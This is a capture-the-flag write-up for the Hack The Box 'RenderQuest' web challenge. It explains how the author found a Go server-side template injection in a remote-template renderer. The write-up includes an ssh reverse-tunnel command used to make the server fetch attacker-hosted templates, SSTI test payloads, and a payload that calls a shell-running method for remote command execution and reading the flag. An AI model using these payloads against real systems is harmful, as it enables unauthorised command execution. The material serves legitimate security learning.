# TL;DR

1. Opened the web page and saw that there was a form to render a web page via a link
2. Tried a random input and got an internal server error from clicking the 'Render now' button
3. Saw the request in Burpsuite and noticed that the request had two params
4. Checked the source code in the main.go file and looked into how it handled the render functionality.
5. Saw that the code was rendering server templates and tried to use a SSTI payload for golang
6. Found it worked and researched how to exploit this SSTI vuln
7. Found that I can call any function with a datatype using the SSTI vuln
8. Used a function that used a shell command as a param and used that RCE to find/cat the flag

# Detailed Writeup

When we start up the challenge and browse to the main site we see this:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

At the bottom of the page we see that it prompts us to send in a link to your template. The first thing I thought of was server side template injection but before I jumped into that I needed to know how the website if you put in just anything. 

I just put in 'asdf' and clicked the 'Render now' button. I was greeted with an 'Internal server error' message:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

I then started to look at the request in Burpsuite to see what was specifically being sent:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

What was interesting is that there were two parameters that were being sent to the website and was curious as too what their purpose really was. I later found out once, I started to look into the source code. Looking at source code being said, lets look at the source code and try understand what the web app is doing on the backend.

The file that was the most interesting was the main.go file:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

**NOTE:** I put in a few print statements to log what was happening in the web app as it was running for troubleshooting purposes. Furthermore, these log statements are, of course, not part of the code that is given with the challenge. Additionally, I dedicated a header to some of the troubleshooting I did for this challenge if you are interested.

If we read the main function, we see that the web app is handling requests to '/', '/render', and '/static/' directories. The most interesting request handling was, of course, with the '/render/ directory. The handling of the directory uses a function called 'getTpl', grabs a url that is passed in the 'page' parm in the get request to this directory. Here is the part of the code in question:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

The code also later has logic that handles the 'remote' param of the get request. I thought it was interesting at first, but later found out that this did not have much impact when I did the exploitation, or at least I don't think it had much impact. 

When 'remote' is set to 'true' it passes the url in the 'page' param in the get request into the 'readRemoteFile' function, which does as it sounds reads a remote file. This starts to confirm that maybe I can try to do some kind of template injection, but let's continue with the code. 

Going down to the last parts of the 'getTpl' function, we see that it uses a function called tmpl.Execute() where it seems that it renders the remote file. With this we know that the server will attempt to reach out to a remote server to render a file. This being the case, let's try to spin up a python web server and get the website to reach to it just to see if we get a hit.

**NOTE:** the following header is how I did troubleshooting to figure out how to get the website to connect to the python web server as I had some trouble trying to get website to do this. If you want to skip this, click [here](#exploitation)

## Troubleshooting

Now I had a lot of difficultly trying to figure out why python server was not getting any hits from server. We know via the code, the web app should be able to reach out to remote servers. 

When I saw this I figured it was something wrong with the IP address that gave to the server to reach back to. I saw that the server provided the your IP address in the cookie. So I tried that IP address and the site hung for a bit but still had an internal server error after a bit of waiting. 

At the time I had assumed that the web challenges were on the internal network IP for some reason so I tried to supply a tun0 IP address (ノ_<。). That didn't work. Lo and behold the issue with the IP address would be the problem that I figured out later but had to be done in a certain way. 

But at the time, I gave up after this and starting spinning up the docker container that was in project code. What I ended up doing was creating a log file in the code and getting the code to write into the log file at important locations where the code would return an internal server error. I focused on the 'getTpl' function and the error handling code.

Now working with the docker container I had put in various payloads into the 'page' param in the get request to try to reach to my python server. I had used a eth0 IP address and that didn't connect at first. I had specifically used <eth0 IP address>:8000 and that didn't work. So I then tried http://<eth0 IP address>:8000 and it suddenly worked which was odd. So that only thing I could conclude was that web app just couldn't get back to my IP address because the IP address in the cookie was not specific enough

### How I Actually Fixed My Issue

I remembered that I had to do something similar with another CTF where I needed to reach back to my python server. What I had done was that I had to spin up a temporary domain and portforward that traffic going to port 80 to port 8000 where my python server resided. The command I had used was the following command:

```bash
ssh -R 80:localhost:8000 nokey@localhost.run
```

After this, I copied the temp domain and gave the url: http://<temp domain name>/<name of html file>.html to the 'page' param and I was able to get a hit to my python server

## Exploitation

After all that troubleshooting we were able to get the server to finally render basic html from the python server:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

Knowing that we can finally do this, this means that we should try to see if we can try to render anything with a server template. I first started with looking into hacktricks for server side template injection (SSTI) payloads for golang web apps to test if it would render on the page. Hacktricks did have two payloads to test this. It does talk about how it works briefly but didn't seem to go any further and I wanted more detail. This I had to do some further research on. But here are the two different ways from hacktricks: 

**Payload 1:**
```
{{.}}
```
**Payload 2:**
```
{{printf "%s" "ssti" }}
```

I had opted for the second payload at the time and was able to get results:

**NOTE:** I hosted a file called test3.html at the time with just '{{printf "%s" "ssti" }}' in the file

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

Now the question remains. How do we start executing commands on the web server to get the flag? With that question in mind I did some research into golang SSTI. After a quick google search I landed on this article: https://www.onsecurity.io/blog/go-ssti-method-research/

The article explains in more detail about the SSTI in golang. But to summarize the important bits of the article, through an SSTI you can actually call certain functions within the code. These functions must have a datatype assigned to them and in order to use that function in an SSTI you have to the following:

```
{{.<functionNameWithDataType> "<args>"}}
```

So in the case of the source code there is a function called 'FetchServerInfo' that we can call with an SSTI due to that function having a datatype associated with it that can call functions. This function has a command string passed into the function to grab the hostname of the web app. So in order to exploit this the SSTI would look like the following:

```
{{.FetchServerInfo "id"}}
```

This would return group info on the web app:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

What is happening is that the template injection calls upon the FetchServerInfo function and we pass 'id' as the shell command. How do we know it's going to run a shell command? Well, if we look at the code for the 'FetchServerInfo' function it actually is building a linux command where the string var 'command' is being used in building out that linux command using 'sh'. Isn't that nice? The function will then output the result of the command to the page where, in our case, we see the group info for the web app server. 

This being the case, let's look for the flag. Looking at the rest of the project in the challenge it has an entrypoint.sh file that shows that the flag is placed in the root directory with a random assortment of digits and letters. So let's 'ls' the root directory:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)

Now let's cat the flag!:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/RenderQuest/)